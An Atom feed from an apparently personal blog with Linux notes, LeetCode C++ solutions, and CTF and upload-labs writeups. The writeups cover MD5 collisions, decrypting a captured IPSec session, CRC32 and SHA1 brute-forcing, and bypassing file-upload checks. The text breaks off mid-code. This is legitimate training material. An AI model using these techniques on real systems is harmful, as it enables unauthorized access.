<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Snail</title>
  
  <subtitle>everbodyup</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-05-19T06:39:46.388Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Jason_xi</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux_Learn</title>
    <link href="http://yoursite.com/2019/05/01/Linux_Learn/"/>
    <id>http://yoursite.com/2019/05/01/Linux_Learn/</id>
    <published>2019-04-30T16:00:00.000Z</published>
    <updated>2019-05-19T06:39:46.388Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf ×××<span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line">tar -jxvf ×××<span class="selector-class">.tar</span><span class="selector-class">.bz2</span></span><br></pre></td></tr></table></figure><p>-z ：是否同时具有 gzip 的属性？亦即是否需要用 gzip 压缩？<br>-j ：是否同时具有 bzip2 的属性？亦即是否需要用 bzip2 压缩？</p><p><strong>wait for uptate</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;解压&quot;&gt;&lt;a href=&quot;#解压&quot; class=&quot;headerlink&quot; title=&quot;解压&quot;&gt;&lt;/a&gt;解压&lt;/h1&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span
      
    
    </summary>
    
    
      <category term="operate system" scheme="http://yoursite.com/tags/operate-system/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode_practice</title>
    <link href="http://yoursite.com/2019/04/19/Leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2019/04/19/Leetcode刷题记录/</id>
    <published>2019-04-18T16:00:00.000Z</published>
    <updated>2019-05-19T06:36:19.863Z</updated>
    
    <content type="html"><![CDATA[<h1 id="237-Delete-Node-in-a-Linked-List"><a href="#237-Delete-Node-in-a-Linked-List" class="headerlink" title="237. Delete Node in a Linked List"></a>237. Delete Node in a Linked List</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Write a function to delete a node (except the tail) in a singly linked list, given only access to that node.   </span><br><span class="line"></span><br><span class="line">Given linked list -- head = [4,5,1,9], which looks like following:   </span><br><span class="line"></span><br><span class="line">Example 1:   </span><br><span class="line"></span><br><span class="line">Input: head = [4,5,1,9], node = 5   </span><br><span class="line">Output: [4,1,9]    </span><br><span class="line">Explanation: You are given the second node with value 5,   the linked list should become 4 -&gt; 1 -&gt; 9 after calling   your function.  </span><br><span class="line">Example 2:   </span><br><span class="line"></span><br><span class="line">Input: head = [4,5,1,9], node = 1   </span><br><span class="line">Output: [4,5,9]  </span><br><span class="line">Explanation: You are given the third node with value 1, the linked list should become 4 -&gt; 5 -&gt; 9 after calling your function.</span><br></pre></td></tr></table></figure><p>Note:   </p><p>The linked list will have at least two elements.<br>All of the nodes’ values will be unique.<br>The given node will not be the tail and it will always be a valid node of the linked list.<br>Do not return anything from your function.     </p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>链表的删除操作，节点分为val和next，一般操作是进行从前到后遍历，找到要删除节点的前驱结点的.利用头指针进行删除。看操作   </p><ul><li>head-&gt;next-&gt;val判断是否要删除的节点   </li><li>head-next=head-&gt;next-&gt;next 头指针指向了删除节点的下一个节点。    </li></ul><p>结果题目没有条件找到前驱节点指针，就有了比较吊的思维。所要删除节点的值的后一个节点的值赋给删除节点，然后再将要删除的节点的后继指针指向下一个节点的后继指针。学到了。  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode* node)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       node-&gt;val=node-&gt;next-&gt;val;</span><br><span class="line"></span><br><span class="line">       node-&gt;next=node-&gt;next-&gt;next;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="155-Min-Stack"><a href="#155-Min-Stack" class="headerlink" title="155 Min Stack"></a>155 Min Stack</h1><h2 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Design a stack that supports push, pop, top, and retrieving the minimum element in constant time.</span><br><span class="line"></span><br><span class="line">- push(x) -- Push element x onto stack.</span><br><span class="line">- pop() -- Removes the element on top of the stack.</span><br><span class="line">- top() -- Get the top element.</span><br><span class="line">- getMin() -- Retrieve the minimum element in the stack.</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">MinStack minStack = new MinStack(); </span><br><span class="line">minStack.push(-2); </span><br><span class="line">minStack.push(0); </span><br><span class="line">minStack.push(-3);   </span><br><span class="line">minStack.getMin();   --&gt; Returns -3.  </span><br><span class="line">minStack.pop();   </span><br><span class="line">minStack.top();      --&gt; Returns 0.  </span><br><span class="line">minStack.getMin();   --&gt; Returns -2.</span><br></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p>双栈很简单，也就是一个栈stack1进行正常的push()和pop()操作，这里用了一个最小栈MinStack进行辅助处理，也就是先判断MinStack()是否为空，如果为空就直接push();不为空stack1 push的时候和MinStack().top()值进行比较，小的话直接push();pop()的话很简单stack() pop()时候，判断和MinStack.top()值相等也就把最小值也出栈。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; stack1;</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; minStack;</span><br><span class="line">    MinStack() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">     stack1.push(x);</span><br><span class="line">        <span class="keyword">if</span>(minStack.empty()||x&lt;=minStack.top())&#123;</span><br><span class="line">            minStack.push(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stack1.top()==minStack.top())&#123;</span><br><span class="line">            minStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        stack1.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stack1.top();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> minStack.top();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p>单栈解决思想，用min记录最小值，每次push(x)的时候与min比较，如果x&lt;=min,就把前一个的最小值先入栈，然后将x入栈，思想就是每次将old minimum入栈之后,更新minimum,这样pop()的时候，只需比较与minimum的值，如果相等pop twice，这样最小值在O(1)时间内就找到了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">    <span class="keyword">int</span> min,current;</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; minStack;</span><br><span class="line">    MinStack() &#123;</span><br><span class="line">        min=INT_MAX;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;=min)&#123;</span><br><span class="line">            minStack.push(min);</span><br><span class="line">            min=x;</span><br><span class="line">        &#125;</span><br><span class="line">        minStack.push(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        current=minStack.top();</span><br><span class="line">        minStack.pop();</span><br><span class="line">        <span class="keyword">if</span>(current==min)&#123;</span><br><span class="line">            min=minStack.top();</span><br><span class="line">            minStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> minStack.top();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Reverse-Linked-List"><a href="#Reverse-Linked-List" class="headerlink" title="Reverse Linked List"></a>Reverse Linked List</h1><h2 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h2><p>Reverse a singly linked list.</p><p>Example:</p><p>Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL<br>Output: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL<br>Follow up:</p><p>A linked list can be reversed either iteratively or recursively. Could you implement both?</p><h2 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h2><h3 id="非递归"><a href="#非递归" class="headerlink" title="非递归"></a>非递归</h3><p>思路： 一个temp指针保存后继节点用于后移，prev指针保存前驱节点，反转的时候curr指针的后继节点指向prev,curr后移不断迭代完成操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode *prev=<span class="literal">NULL</span>;     <span class="comment">//前指针节点</span></span><br><span class="line">        ListNode *curr=head;<span class="comment">//当前指针节点</span></span><br><span class="line">        <span class="keyword">while</span>(curr!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        ListNode *temp=curr-&gt;next;  <span class="comment">//保存后继节点</span></span><br><span class="line">            curr-&gt;next=prev;  <span class="comment">//指向前节点</span></span><br><span class="line">            prev=curr;<span class="comment">//前指针后移</span></span><br><span class="line">            curr=temp;  <span class="comment">//当前指针后移</span></span><br><span class="line">        &#125;</span><br><span class="line">        head=prev;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;237-Delete-Node-in-a-Linked-List&quot;&gt;&lt;a href=&quot;#237-Delete-Node-in-a-Linked-List&quot; class=&quot;headerlink&quot; title=&quot;237. Delete Node in a Linked
      
    
    </summary>
    
    
      <category term="code" scheme="http://yoursite.com/tags/code/"/>
    
  </entry>
  
  <entry>
    <title>安恒2月月赛 writeup</title>
    <link href="http://yoursite.com/2019/02/27/%E5%AE%89%E6%81%922%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/"/>
    <id>http://yoursite.com/2019/02/27/安恒2月月赛Writeup/</id>
    <published>2019-02-26T16:00:00.000Z</published>
    <updated>2019-03-10T15:54:43.068Z</updated>
    
    <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="来玩个游戏吧"><a href="#来玩个游戏吧" class="headerlink" title="来玩个游戏吧"></a>来玩个游戏吧</h2><p>打开exe文件发现两个关卡。 </p><ul><li>第一个考察点盲文解密</li><li><p>第二个考察点MD5碰撞<br><code>⠏⠏⠄⠁⠄⠀⠂⡑⡒⡓⠄⡒⠂⡑⠇⠆⡒⠉⠇⠁⠉⡔⠉⠁⠁⠀⠁⠇⡓⠅⠉⠂=</code> 直接放到在线网站解密为??41402abc4b2a76b9719d911017c592<br><img src="https://i.imgur.com/icbPV2Y.jpg" alt=""></p><p>百度搜索为hello </p></li></ul><p><img src="https://i.imgur.com/XvgLsqf.png" alt=""></p><p>提交之后通过第一关。 第二关MD5碰撞利用fastcoll工具产生两个具有相同MD5值得不同文件<br>Windows下可用<code>certutil -hashfile 路径 MD5</code>检测hash值<br><img src="https://i.imgur.com/JoGOOqO.png" alt=""></p><p>提交之后得到一封邮件如下。<br><img src="https://i.imgur.com/VnGvgN1.jpg" alt=""></p><p>根据提示栅格加密搜索找到解密网站。<br><img src="https://i.imgur.com/7H85y0k.png" alt=""></p><h2 id="非常简单的流量分析"><a href="#非常简单的流量分析" class="headerlink" title="非常简单的流量分析"></a>非常简单的流量分析</h2><p>http过滤在流量包中发现robots.txt,追踪http流进行分析。</p><p><img src="https://i.imgur.com/qPxIinD.png" alt=""><br>继续分析<code>http contains abc.html</code><br>跟踪HTTP流发现<br><img src="https://i.imgur.com/ttEqqMH.png" alt=""></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">md5 <span class="number">0x99a98e067af6b09e64f3740767096c96</span></span><br><span class="line"></span><br><span class="line">DES 0xb19b21e80c685bcb052988c11b987802d2f2808b2c2d8a0d(129-&gt;143)</span><br><span class="line"></span><br><span class="line">DES 0x684a0857b767672d52e161aa70f6bdd07c0264876559cb8b(143-&gt;129)</span><br></pre></td></tr></table></figure><p>继续分析发现流量经过了IP Sec加密。<br><img src="https://i.imgur.com/gsJYHB1.png" alt=""><br>因此根据发现的信息和加密的方式在Wireshark中还原。<br><img src="https://i.imgur.com/n7JVU4J.png" alt=""></p><p>Encryption Key填写DES对应的加密值，Authentication Key填写发现的md5值。SPI填写对应的SPI。还原之后的内容发现一些奇怪的ascii码值。</p><p><img src="https://i.imgur.com/3dt2RYS.png" alt=""><br>将对应的ascii码值进行解密得到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">asc=[<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">123</span>,<span class="number">50</span>,<span class="number">55</span>,<span class="number">98</span>,<span class="number">48</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">55</span>,<span class="number">53</span>,<span class="number">56</span>,<span class="number">102</span>,<span class="number">50</span>,<span class="number">53</span>,<span class="number">53</span>,<span class="number">50</span>,<span class="number">55</span>,<span class="number">54</span>,<span class="number">101</span>,<span class="number">53</span>,<span class="number">97</span>,<span class="number">57</span>,<span class="number">56</span>,<span class="number">100</span>,<span class="number">97</span>,<span class="number">48</span>,<span class="number">101</span>,<span class="number">49</span>,<span class="number">57</span>,<span class="number">52</span>,<span class="number">55</span>,<span class="number">98</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">125</span>]</span><br><span class="line"></span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> asc:</span><br><span class="line">    res+=chr(i)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/E7qWryi.png" alt=""></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="hahahaha"><a href="#hahahaha" class="headerlink" title="hahahaha"></a>hahahaha</h2><p>CRC（循环冗余校验）,是一种根据网络数据包或计算机文件等数据产生简短固定位数校验码的一种散列函数，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。主要用来检测或校验数据传输或者保存后可能出现的错误。CRC32源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，数据算出对应CRC，逆推根据CRC推测出数据，低位数CRC通过爆破即可。</p><p>具体参考<a href="https://www.anquanke.com/post/id/86211" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86211</a></p><p>打开zip文件发现加密，并且压缩包有四个txt，可通过CRC32爆破内容<br><img src="https://i.imgur.com/6WwpDzo.png" alt=""></p><p><img src="https://i.imgur.com/9fd93G3.png" alt=""></p><p>依次爆破可以看到隐藏信息 <code>tanny_is_very_beautifu1_</code></p><p>解密flag.pdf看到<br><img src="https://i.imgur.com/Iu6Gu9y.jpg" alt=""><br>根据提示按键生成字典长度为13<code>12!@eshcn</code><br>进行组合可以发现存在<code>flag{}</code>按键，所以仅需将剩下的7位爆破即可<br>得到sha1值<code>e6079c5ce56e781a50f4bf853cdb5302e0d8f054</code></p><p>脚本如下<br>利用<code>permutations生成字典序列</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">str=<span class="string">'1!2@eshcn'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(str,<span class="number">7</span>):</span><br><span class="line">    <span class="comment">#print i</span></span><br><span class="line">    res=<span class="string">'flag&#123;'</span>+<span class="string">''</span>.join(i)+<span class="string">'&#125;'</span></span><br><span class="line">    <span class="keyword">if</span> hashlib.sha1(res).hexdigest()==<span class="string">"e6079c5ce56e781a50f4bf853cdb5302e0d8f054"</span>:</span><br><span class="line">        <span class="keyword">print</span> res</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/7IXPI1d.png" alt=""></p><h2 id="密码本"><a href="#密码本" class="headerlink" title="密码本"></a>密码本</h2><p>百度一次性密码本。<br>加密方法<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">举个例子，若要加密讯息“This is an example”，而用以加密的一次性密码本如下所示：</span><br><span class="line">MASKL NSFLD FKJPQ</span><br><span class="line">则利用指定数字的方法，可分别将两者给做以下的转换：</span><br><span class="line">This is an example → <span class="number">19</span> <span class="number">7</span> <span class="number">8</span> <span class="number">18</span> <span class="number">8</span> <span class="number">18</span> <span class="number">0</span> <span class="number">13</span> <span class="number">4</span> <span class="number">23</span> <span class="number">0</span> <span class="number">12</span> <span class="number">15</span> <span class="number">11</span> <span class="number">4</span></span><br><span class="line">MASKL NSFLD FKJPQ → <span class="number">12</span> <span class="number">0</span> <span class="number">18</span> <span class="number">10</span> <span class="number">11</span> <span class="number">13</span> <span class="number">18</span> <span class="number">5</span> <span class="number">11</span> <span class="number">3</span> <span class="number">5</span> <span class="number">10</span> <span class="number">9</span> <span class="number">15</span> <span class="number">16</span></span><br><span class="line">两者依序相加后得到的讯息如下：</span><br><span class="line"><span class="number">31</span> <span class="number">7</span> <span class="number">26</span> <span class="number">28</span> <span class="number">19</span> <span class="number">31</span> <span class="number">18</span> <span class="number">18</span> <span class="number">15</span> <span class="number">26</span> <span class="number">5</span> <span class="number">22</span> <span class="number">24</span> <span class="number">26</span> <span class="number">20</span></span><br><span class="line">将以上得到的讯息模<span class="number">26</span>后可得：</span><br><span class="line"><span class="number">5</span> <span class="number">7</span> <span class="number">0</span> <span class="number">2</span> <span class="number">7</span> <span class="number">5</span> <span class="number">8</span> <span class="number">8</span> <span class="number">11</span> <span class="number">0</span> <span class="number">5</span> <span class="number">22</span> <span class="number">24</span> <span class="number">0</span> <span class="number">20</span></span><br><span class="line">它也就变成了</span><br><span class="line">FHACHFIILAFWYAU</span><br><span class="line">而若要解密以上信息，反向操作即可。</span><br></pre></td></tr></table></figure></p><p>附解密脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">key=&apos;year&apos;</span><br><span class="line">cip1=&apos;rlojsfklecby&apos;</span><br><span class="line">cip2=&apos;ulakqfgfsjlu&apos;</span><br><span class="line">cip3=&apos;dpaxwxtjgtay&apos;</span><br><span class="line">pl1=&apos;&apos;</span><br><span class="line">pl2=&apos;&apos;</span><br><span class="line">pl3=&apos;&apos;</span><br><span class="line">for i in range(len(key)):</span><br><span class="line">    pl1 += chr((((ord(cip1[i]) - ord(&apos;a&apos;)) - (ord(key[i]) - ord(&apos;a&apos;))) % 26) + ord(&apos;a&apos;))</span><br><span class="line">    pl2 += chr((((ord(cip2[i]) - ord(&apos;a&apos;)) - (ord(key[i]) - ord(&apos;a&apos;))) % 26) + ord(&apos;a&apos;))</span><br><span class="line">    pl3 += chr((((ord(cip3[i]) - ord(&apos;a&apos;)) - (ord(key[i]) - ord(&apos;a&apos;))) % 26) + ord(&apos;a&apos;))</span><br><span class="line"></span><br><span class="line">print pl1</span><br><span class="line">print pl2</span><br><span class="line">print pl3</span><br></pre></td></tr></table></figure></p><p>出现<img src="https://i.imgur.com/FVSvXnf.jpg" alt=""><br>推测thos下一个字母是e<br>经过测试key的下一个字母为o<br><img src="https://i.imgur.com/h5slhXD.png" alt=""><br><code>yearo</code>解密之后如下<img src="https://i.imgur.com/A1QFW7y.png" alt=""></p><p>然后可以猜测flagi后面为s，进行测试，探测出<code>yearof</code><br><img src="https://i.imgur.com/49DUU7Z.png" alt=""><br>根据whatca可推测下一个字母为n,进行测试,探测<code>yearoft</code><br><img src="https://i.imgur.com/nsfm7AM.png" alt=""><br>根据thosear推测e,探测出<code>yearofth</code><br>whatcanyou推测出<code>yearofthep</code><br>flagisaccess推测出<code>yearofthepig</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="my-email"><a href="#my-email" class="headerlink" title="my_email"></a>my_email</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h1&gt;&lt;h2 id=&quot;来玩个游戏吧&quot;&gt;&lt;a href=&quot;#来玩个游戏吧&quot; class=&quot;headerlink&quot; title=&quot;来玩个游戏
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>upload-labs writeup</title>
    <link href="http://yoursite.com/2019/02/21/upload-labs/"/>
    <id>http://yoursite.com/2019/02/21/upload-labs/</id>
    <published>2019-02-20T16:00:00.000Z</published>
    <updated>2019-02-21T01:48:43.561Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前端js检查,burp抓包修改后缀或者禁用js</p><h1 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h1><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">       <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span 